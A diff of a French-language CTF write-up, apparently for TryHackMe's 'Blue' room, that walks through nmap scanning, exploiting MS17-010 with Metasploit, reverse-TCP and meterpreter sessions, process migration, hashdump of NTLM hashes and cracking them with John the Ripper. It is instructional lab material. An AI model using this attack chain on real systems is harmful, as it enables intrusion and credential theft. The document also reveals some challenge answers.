@@ -8,6 +8,7 @@ Outils utilisés: [NMAP](https://nmap.org/)
 
 <pre>
 How many ports are open with a port number under 1000?
+
 Combien de ports sont ouverts avec un numéro de port inférieur à 1000 ?
 </pre>
 
@@ -15,7 +16,8 @@ Combien de ports sont ouverts avec un numéro de port inférieur à 1000 ?
 
 > [!TIP]
 > Near the top of the nmap output: PORT STATE SERVICE
-> <br>Dans les premières lignes de la sortie de nmap : PORT STATE SERVICE
+> 
+> Dans les premières lignes de la sortie de nmap : PORT STATE SERVICE
 
 <br>Pour cet exercice, pas de grandes difficultés, il suffit simplement de lancer `nmap` comme mentionné:
 
@@ -39,6 +41,7 @@ nmap -Pn <IP_CIBLE>
 
 <pre>
 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
+
 À quoi cette machine est-elle vulnérable ? (Réponse sous la forme : ms??- ????, ex : ms08-067)
 </pre>
 
@@ -46,7 +49,8 @@ What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-0
 
 > [!TIP]
 > Revealed by the ShadowBrokers, exploits an issue within SMBv1
-> <br>Révélée par les ShadowBrokers, elle exploite un problème au sein de SMBv1.
+> 
+> Révélée par les ShadowBrokers, elle exploite une faille au sein de SMBv1.
 
 <br>Pour répondre à cette question, nous allons utiliser le flag `--script` et le mot clé `vuln`, ce qui va lister les vulnérabiltés sur cette machine.
 
@@ -120,11 +124,12 @@ Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
 </pre>
 
 <br>Il y a plusieurs vulnérabilités, pour savoir laquelle est notre réponse, il faut se souvenir de l'indice qui porte sur un exploit de `SMBv1`.
+<br>Exceptionnellement, je donne cette réponse car elle va être dévoilée a plusieurs reprises par la suite.
 
 <br>
 
 > [!IMPORTANT]
-> <b>ms°°-°°°</b>
+> <b>ms17-010</b>
 
 ---
 
@@ -148,6 +153,7 @@ msfconsole
 
 <pre>
 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+
 Trouvez le code d'exploitation que nous allons exécuter sur la machine. Quel est le chemin complet du code ? (Ex : exploit/........)
 </pre>
 
@@ -155,17 +161,16 @@ Trouvez le code d'exploitation que nous allons exécuter sur la machine. Quel es
 
 > [!TIP]
 > search ms??
-> <br>Chercher ms??
+> 
+> Chercher ms??
 
 <br>Une fois que `Metasploit` est à jour, nous pouvons chercher l'exploit de la vulnérabilité trouvée dans l'exercice précédent.
 
 <br>
 
 ```bash
-search ms°°-°°°
+search ms17-010
 ```
-
-Bien évidement, remplacez `ms°°` par la réponse de toute à l'heure.
 
 <br>
 
@@ -200,6 +205,7 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 
 <pre>
 Show options and set the one required value. What is the name of this value? (All caps for submission)
+
 Afficher les options et définir la seule valeur requise. Quel est le nom de cette valeur ? (Tout en majuscules pour la soumission)
 </pre>
 
@@ -207,7 +213,8 @@ Afficher les options et définir la seule valeur requise. Quel est le nom de cet
 
 > [!TIP]
 > Command: show options
-> <br>Commande: show options
+>
+> Commande: show options
 
 <br>Sélectionnez l'exploit:
 
@@ -245,7 +252,7 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.185.18     yes       The listen address (an interface may be specified)
+   LHOST     &lt;IP_ATTACK&gt;      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
 
@@ -281,8 +288,10 @@ Remplacez `°°°` par la réponse précédente.
 <br>
 
 <pre>
-Normalement, il est possible d'exécuter cet exploit tel quel, cependant, pour le bien de l'apprentissage, vous devriez
-faire une chose de plus avant d'exploiter la cible. Entrez la commande suivante et appuyez sur Entrée.
+Normalement, il est possible d'exécuter cet exploit tel quel, cependant, pour le bien de l'apprentissage, vous devriez faire une chose de plus
+avant d'exploiter la cible. 
+Entrez la commande suivante et appuyez sur Entrée.
+
 <b>NOTE</b>: Toujours sous "Metasploit".
 </pre>
 
@@ -293,8 +302,11 @@ set payload windows/x64/shell/reverse_tcp
 payload => windows/x64/shell/reverse_tcp
 </pre>
 
+<br>
+
 <pre>
 With that done, run the exploit!
+
 Une fois cela fait, lancez l'exploit !
 </pre>
 
@@ -367,7 +379,8 @@ exact, similaire à l'exploit que nous avons sélectionné précédemment)
 
 > [!TIP]
 > Google this: shell_to_meterpreter
-> <br>Cherchez sur Google : shell_to_meterpreter
+>
+> Cherchez sur Google : shell_to_meterpreter
 
 <br>Une fois le `DOS` mis en arrière-plan, vous revenez sur `Metasploit`, tapez:
 
@@ -388,6 +401,7 @@ search shell_to_meterpreter
 
 <pre>
 Select this (use MODULE_PATH). Show options, what option are we required to change?
+
 Sélectionnez ceci (use MODULE_PATH). Afficher les options, quelle option devons-nous modifier ?
 </pre>
 
@@ -429,7 +443,18 @@ View the full module info with the info, or info -d command.
 
 <pre>
 Set the required option, you may need to list all of the sessions to find your target here.
+
 Définissez l'option requise, il se peut que vous deviez lister toutes les sessions pour trouver votre cible ici. 
+</pre>
+
+<br>Tapez:
+
+
+```bash
+set LHOST <IP_CIBLE>
+```
+<pre>
+LHOST => &lt;IP_CIBLE&gt;
 </pre>
 
 <br>
@@ -455,49 +480,330 @@ Active sessions
 <br>Tapez:
 
 ```bash
-set SESSION 1
+set SESSION 2
 ```
 <pre>
-SESSION => 1
+SESSION => 2
 </pre>
 
-<br>Puis tapez:
+<br>Tapez:
 
 ```bash
-set LHOST <IP_CIBLE>
+sessions -i 2
 ```
+
 <pre>
-LHOST => &lt;IP_CIBLE&gt;
+[*] Starting interaction with 1...
+
+meterpreter > 
 </pre>
 
 <br>
 
 <pre>
-Run! If this doesn't work, try completing the exploit from the previous task once more.
-Exécutez ! Si cela ne fonctionne pas, essayez à nouveau de réaliser l'exploit de la tâche précédente.
+Nous avons maintenant une session <b>meterpreter</b>.
+Nous fonctionnons en tant que système, mais cela n'indique pas que notre processus le soit. Nous devons migrer vers un autre
+processus. En général, nous utilisons services.exe.
+</pre>
+
+<br>Tapez:
+
+```bash
+ps
+```
+
+<pre>
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 512   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 540   532   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 584   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 588   532   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 600   580   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 640   580   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ <b>668   588   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe</b>
+ 688   588   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 696   588   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 816   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 828   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 888   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1004  640   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1076  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1176  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1260  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1300  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1340  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1404  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.ex
+                                                                                e
+ 1480  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1588  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Con
+                                                                                fig.exe
+ 1608  816   WmiPrvSE.exe
+ 1932  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2296  512   Defrag.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\defrag.exe
+ 2520  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2776  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2808  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2844  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 2936  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+</pre>
+
+<br>Dans mon cas, c'est le PID `668`, il peut être différent pour vous, soyez attentif.
+<br>Il s'agit maintenant de migrer vers le PID:
+
+```bash
+migrate 668
+```
+<pre>
+[*] Migrating from 1300 to 668...
+[*] Migration completed successfully.
+</pre>
+
+---
+
+## TACHE 4 - CRACKING
+
+<pre>
+Within our elevated <b>meterpreter</b> shell, run the command <b>hashdump</b>. This will dump all of the passwords
+on the machine as long as we have the correct privileges to do so. What is the name of the
+non-default user?
+
+Dans notre shell <b>meterpreter</b> élevé, lancez la commande <b>hashdump</b>. Cette commande permet d'extraire
+tous les mots de passe de la machine, à condition que nous ayons les privilèges nécessaires pour le
+faire. Quel est le nom de l'utilisateur qui n'est pas celui par défaut ? 
+</pre>
+
+### Question 1
+
+<pre>
+Dump the non-default user's password and crack it!
+
+Extraire le mot de passe de l'utilisateur qui n'est pas le mot de passe par défaut et le déchiffrer !
+</pre>
+
+<br>Tapez:
+
+```bash
+hashdump
+```
+<pre>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<b>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</b>
+</pre>
+
+<br>
+
+> [!IMPORTANT]
+> <b>JON</b>
+
+<br>
+
+### Question 2
+
+<pre>
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+Copiez le hachage de ce mot de passe dans un fichier et recherchez comment le craquer. Quel est le mot de passe déchiffré ?
 </pre>
 
 <br>
 
 > [!TIP]
-> Command: run (or exploit)
-> <br>Commande: run (ou exploit)
-> <br><br><b>NOTE</b>: Les commmandes `run` et `exploit` font en réalité la même chose.
+> This password can be found within the rockyou.txt wordlist
+>
+> Ce mot de passe se trouve dans la liste de mots rockyou.txt
+
+<br>Pour cracker le mot de passe, nous allons utiliser le programme `John The Ripper`.
+<br>Pour commencer et comme précisé, copiez le mot de passe dans un fichier.
+<br>Ouvrez un nouveau Terminal, rendez-vous dans le dossier `Downloads`et créez le fichier:
 
 ```bash
-run
+cd Downloads && echo Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: > hash
 ```
+
+<br>Ensuite, lancez `John The Ripper`:
+
+```bash
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
 <pre>
-[*] Upgrading session ID: 1
-[*] Starting exploit/multi/handler
-[-] Handler failed to bind to &lt;IP_CIBLE&gt;:4433:-  -
-[*] Started reverse TCP handler on 0.0.0.0:4433 
-[*] Post module execution completed
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+°°°°°°°°         (Jon)
+1g 0:00:00:01 DONE (2024-09-13 09:41) 0.6535g/s 6666Kp/s 6666Kc/s 6666KC/s alr1979..alpus
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+</pre>
+
+<br>On peut voir que le mot de passe apparaît, ici, remplacé par des `°°`
+
+> [!NOTE]
+> John The Ripper se concentre sur les hachages LM plutôt que NTLM par défaut.
+> <br>Par conséquent, nous devons spécifier le format NT pour les mots de passe Windows.
+
+<br>
+
+> [!IMPORTANT]
+> <b>°°°°°°°°</b>
+
+---
+
+## TACHE 5 - FIND FLAGS
+
+<pre>
+Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations
+within the Windows system. Use the hints provided below to complete this room!
+
+Trouvez les trois drapeaux plantés sur cette machine. Il ne s'agit pas de drapeaux traditionnels, mais de drapeaux représentant
+des emplacements clés du système Windows. Utilisez les indices fournis ci-dessous pour terminer cette salle !
 </pre>
 
 <br>
 
-Je vous laisse finir l'exercice.
+### Question 1
+
+<pre>
+Flag1? This flag can be found at the system root.
+
+Flag1 ? ce drapeau se trouve à la racine du système. 
+</pre>
+
+<br>
+
+> [!TIP]
+> Can you C it?
+>
+> Pouvez-vous l'appeler C ?
+
+<br>Reprenez le Terminal avec `meterpreter`, puis rendez-vous à la racine de `Windows` (C:):
+
+```bash
+cd ../..
+```
+
+<br>Pour être sûr que nous y sommes, vérifions avec la commande `pwd`:
+
+```bash
+pwd
+```
+<pre>
+meterpreter > pwd
+C:\
+</pre>
+
+<br>Si vous tapez la commande `dir`, vous verrez l'arborescence de `C:\` et le premier flag: `flag1.txt`.
+<br>C'est donc ce fichier qu'il va falloir lire.
+
+Ici, rien de bien compliqué, un simple `cat` suffit:
+
+```bash
+cat flag1.txt
+```
+
+<br>
+
+> [!IMPORTANT]
+> flag{°°°°°°°°°°°°°°°°°°}
+
+<br>
+
+### Question 2
+
+<pre>
+Flag2? This flag can be found at the location where passwords are stored within Windows.
+
+Cet indicateur se trouve à l'endroit où les mots de passe sont stockés dans Windows.
+</pre>
+
+<br>
+
+> [!TIP]
+> I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.
+>
+> Je regrette de ne pas avoir noté l'endroit où je conservais mon mot de passe. Heureusement, il est toujours stocké ici, sur Windows.
+
+<br>
+
+> [!NOTE]
+> *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
+>
+> *Errata : Windows n'aime vraiment pas l'emplacement de cet indicateur et peut parfois le supprimer. Dans certains cas, il peut être nécessaire d'arrêter/redémarrer la machine et de réexécuter l'exploit pour trouver ce drapeau. C'est relativement rare, mais cela peut arriver.
+
+<br>
+
+> [!TIP]
+> Pour savoir où sont cachés les flags, tapez la commande:
+> ```search -f flag*```
+
+<pre>
+meterpreter > search -f flag*
+Found 6 results...
+==================
+
+Path                                                             Size (bytes)  Modified (UTC)
+----                                                             ------------  --------------
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-17 19:26:42 +0000
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-17 19:30:04 +0000
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-17 19:32:52 +0000
+<b>c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-17 19:26:36 +0000
+c:\Windows\System32\config\flag2.txt                             34            2019-03-17 19:32:48 +0000
+c:\flag1.txt</b>
+</pre>
+
+<br>Ainsi, nous pouvons voir que le deuxième flag se situe: `C:\Windows\System32\config\flag2.txt`
+
+Ici encore, un simple `cat` suffit, (je suppose que vous êtes toujours à la racine de C:\\):
+
+```bash
+cat Windows\\System32\\config\\flag2.txt
+```
+
+<br>
+
+> [!IMPORTANT]
+> flag{°°°°°°°°°°°°°°°°°°°°°°°°°°°°}
+
+<br>
+
+<br>
+
+### Question 3
+
+<pre>
+flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
+
+flag3 ? Ce drapeau se trouve à un endroit idéal pour le piller. Après tout, les administrateurs ont généralement des choses intéressantes à sauvegarder. 
+</pre>
+
+<br>
+
+> [!TIP]
+> You'll need to have elevated privileges to access this flag.
+>
+> Vous devez disposer de privilèges élevés pour accéder à cet indicateur.
+
+<br>Grâce à la commande précédente, qui nous permettait de trouver tous les flags sur le système, nous savons déjà où se trouve le troisième flag: `c:\Users\Jon\Documents\flag3.txt`.
+
+Il s'agit donc, pour la troisième et dernière fois, d'utiliser `cat`:
+
+```bash
+cat Users\\Jon\\Documents\\flag3.txt
+```
+<br>
+
+> [!IMPORTANT]
+> flag{°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°}
 
 <br>
 
